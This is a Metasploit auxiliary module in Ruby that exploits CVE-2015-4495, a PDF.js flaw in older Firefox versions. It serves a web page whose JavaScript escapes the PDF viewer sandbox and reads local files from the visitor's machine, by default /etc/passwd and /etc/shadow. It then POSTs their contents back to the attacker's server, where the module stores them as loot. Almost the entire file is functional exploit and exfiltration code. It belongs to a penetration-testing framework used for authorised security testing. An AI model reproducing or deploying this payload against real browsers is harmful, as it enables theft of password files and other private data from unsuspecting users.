##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Auxiliary::Report

  def initialize(info={})
    super(update_info(info,
      'Name'        => 'Firefox PDF.js Browser File Theft',
      'Description' => %q{
        This module abuses an XSS vulnerability in versions prior to Firefox 39.0.3, Firefox ESR
        38.1.1, and Firefox OS 2.2 that allows arbitrary files to be stolen. The vulnerability
        occurs in the PDF.js component, which uses Javascript to render a PDF inside a frame with
        privileges to read local files. The in-the-wild malicious payloads searched for sensitive
        files on Windows, Linux, and OSX. Android versions are reported to be unaffected, as they
        do not use the Mozilla PDF viewer.
      },
      'Author'         => [
        'Unknown', # From an 0day served on Russian news website
        'fukusa',  # Hacker news member that reported the issue
        'Unknown'  # Metasploit module
      ],
      'License'     => MSF_LICENSE,
      'Actions'     => [[ 'WebServer' ]],
      'PassiveActions' => [ 'WebServer' ],
      'References' =>
        [
          ['URL', 'https://paste.debian.net/290146'], # 0day exploit
          ['URL', 'https://news.ycombinator.com/item?id=10021376'], # discussion with discoverer
          ['URL', 'https://blog.mozilla.org/security/2015/08/06/firefox-exploit-found-in-the-wild/'],
          ['CVE', '2015-4495']
        ],
      'DefaultAction'  => 'WebServer'
    ))

    register_options([
      OptString.new('FILES', [
        false,
        'Comma-separated list of files to steal',
        '/etc/passwd, /etc/shadow'
      ])
    ])

    register_advanced_options([
      OptInt.new('PER_FILE_SLEEP', [
        false,
        'Milliseconds to wait before attempting to read the frame containing each file',
        250
      ])
    ])
  end

  def run
    print_status("File targeted for exfiltration: #{JSON.generate(file_urls)}")
    exploit
  end

  def on_request_uri(cli, request)
    if request.method.downcase == 'post'
      print_status('Got POST request...')
      process_post(cli, request)
      send_response_html(cli, '')
    else
      print_status('Sending exploit...')
      send_response_html(cli, html)
    end
  end

  def process_post(cli, req)
    name = req.qstring['name']
    print_good("Received #{name}, size #{req.body.bytes.length}...")
    output = store_loot(
      name || 'data', 'text/plain', cli.peerhost, req.body, 'firefox_theft', 'Firefox PDF.js exfiltrated file'
    )
    print_good("Stored to #{output}")
  end

  def html
    exploit_js = js + file_payload + '}, 20);'

    "<!doctype html><html><body><script>#{exploit_js}</script></body></html>"
  end

  def backend_url
    proto = (datastore['SSL'] ? 'https' : 'http')
    my_host = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address : datastore['SRVHOST']
    port_str = (datastore['SRVPORT'].to_i == 80) ? '' : ":#{datastore['SRVPORT']}"
    resource = ('/' == get_resource[-1,1]) ? get_resource[0, get_resource.length-1] : get_resource

    "#{proto}://#{my_host}#{port_str}#{resource}/catch"
  end


  def file_payload
    %Q|
      var files = (#{JSON.generate(file_urls)});
      function next() {
        var f = files.pop();
        if (f) {
          get("file://"+f, function() {
            var data = get_data(this);
            var x = new XMLHttpRequest;
            x.open("POST", "#{backend_url}?name="+encodeURIComponent("%URL%"));
            x.send(data);
          }, #{datastore['PER_FILE_SLEEP']}, "%URL%", f);
          setTimeout(next, #{datastore['PER_FILE_SLEEP']}+200);
        }
      }
      next();
    |
  end

  def file_urls
    datastore['FILES'].split(',').map(&:strip)
  end

  def js
    <<-EOJS
function xml2string(obj) {
  return new XMLSerializer().serializeToString(obj);
}

function __proto(obj) {
  return obj.__proto__.__proto__.__proto__.__proto__.__proto__.__proto__;
}

function get(path, callback, timeout, template, value) {
  callback = _(callback);
  if (template && value) {
    callback = callback.replace(template, value);
  }
  js_call1 = 'javascript:' + _(function() {
    try {
      open("%url%", "_self");
    } catch (e) {
      history.back();
    }
    undefined;
  }, "%url%", path);
  js_call2 = 'javascript:;try{updateHidden();}catch(e){};' + callback + ';undefined';
  sandboxContext(_(function() {
    i = document.getElementById('i');
    p = __proto(i.contentDocument.styleSheets[0].ownerNode);
    i2 = document.getElementById('i2');
    l = p.__lookupSetter__.call(i2.contentWindow, 'location');
    l.call(i2.contentWindow, window.wrappedJSObject.js_call1);
  }));
  setTimeout((function() {
    sandboxContext(_(function() {
      p = __proto(i.contentDocument.styleSheets[0].ownerNode);
      l = p.__lookupSetter__.call(i2.contentWindow, 'location');
      l.call(i2.contentWindow, window.wrappedJSObject.js_call2);
    }));
  }), timeout);
}

function get_data(obj) {
  data = null;
  try {
    data = obj.document.documentElement.innerHTML;
    if (data.indexOf('dirListing') < 0) {
      throw new Error();
    }
  } catch (e) {
    if (this.document instanceof XMLDocument) {
        data = xml2string(this.document);
    } else {
      try {
          if (this.document.body.firstChild.nodeName.toUpperCase() == 'PRE') {
              data = this.document.body.firstChild.textContent;
          } else {
              throw new Error();
          }
      } catch (e) {
        try {
          if (this.document.body.baseURI.indexOf('pdf.js') >= 0 || data.indexOf('aboutNetError') > -1) {;
              return null;
          } else {
              throw new Error();
          }
        } catch (e) {
          ;;
        }
      }
    }
  }
  return data;
}

function _(s, template, value) {
  s = s.toString().split(/^\\s*function\\s+\\(\\s*\\)\\s*\\{/)[1];
  s = s.substring(0, s.length - 1);
  if (template && value) {
    s = s.replace(template, value);
  }
  s += __proto;
  s += xml2string;
  s += get_data;
  s = s.replace(/\\s\\/\\/.*\\n/g, "");
  s = s + ";undefined";
  return s;
}

function get_sandbox_context() {
  if (window.my_win_id == null) {
    for (var i = 0; i < 20; i++) {
      try {
        if (window[i].location.toString().indexOf("view-source:") != -1) {
          my_win_id = i;
          break;
        }
      } catch (e) {}
    }
  };
  if (window.my_win_id == null)
    return;
  clearInterval(sandbox_context_i);
  object.data = 'view-source:' + blobURL;
  window[my_win_id].location = 'data:application/x-moz-playpreview-pdfjs;,';
  object.data = 'data:text/html,<'+'html/>';
  window[my_win_id].frameElement.insertAdjacentHTML('beforebegin', '<iframe style='+
    '"position:absolute; left:-9999px;" onload = "'+_(function(){
    window.wrappedJSObject.sandboxContext=(function(cmd) {
      with(importFunction.constructor('return this')()) {
        return eval(cmd);
      }
    });
  }) + '"/>');
}


var i = document.createElement("iframe");
i.id = "i";
i.width=i.height=0;
i.style='position:absolute;left:-9999px;';
i.src = "data:application/xml,<?xml version=\\"1.0\\"?><e><e1></e1></e>";
document.documentElement.appendChild(i);
i.onload = function() {
  if (this.contentDocument.styleSheets.length > 0) {
    var i2 = document.createElement("iframe");
    i2.id = "i2";
    i2.width=i2.height=0;
    i2.style='position:absolute;left:-9999px;';
    i2.src = "data:application/pdf,";
    document.documentElement.appendChild(i2);
    pdfBlob = new Blob([''], {
        type: 'application/pdf'
    });
    blobURL = URL.createObjectURL(pdfBlob);
    object = document.createElement('object');
    object.data = 'data:application/pdf,';
    object.onload = (function() {
        sandbox_context_i = setInterval(get_sandbox_context, 200);
        object.onload = null;
        object.data = 'view-source:' + location.href;
        return;
    });
    document.documentElement.appendChild(object);
  } else {
    this.contentWindow.location.reload();
  }
}

var kill = setInterval(function() {
  if (window.sandboxContext) {
    clearInterval(kill);
  } else {
    return;
  }
EOJS
  end
end
